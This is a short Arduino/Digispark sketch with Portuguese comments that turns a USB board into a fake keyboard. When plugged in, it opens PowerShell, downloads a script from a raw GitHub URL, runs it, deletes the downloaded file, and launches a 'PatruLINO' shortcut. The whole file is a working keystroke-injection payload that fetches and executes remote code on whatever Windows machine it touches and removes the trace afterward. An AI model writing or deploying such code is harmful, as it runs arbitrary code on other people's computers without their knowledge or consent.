#include <Arduino.h>
#include <DigiKeyboard.h>

void setup() {}

void loop() {
    // Baixar o script de powershell
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("$client = new-object System.Net.WebClient");
    DigiKeyboard.println("$client.DownloadFile(\"https://raw.githubusercontent.com/villecaribas/InstallPatrulino/master/downlino.ps1\" , \"$env:userprofile/Desktop/installLino.ps1\")");

    // Execultar o script de instalacao
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell $env:userprofile\\Desktop\\installLino.ps1");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Apagar o script de instalacao
    DigiKeyboard.println("rm $env:userprofile\\Desktop\\installLino.ps1");
    DigiKeyboard.delay(500);

    // Execultar o chrome com o patrulino
    DigiKeyboard.println("powershell $env:userprofile\\Desktop\\PatruLINO.lnk");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("exit");

    for (;;)
        ;
}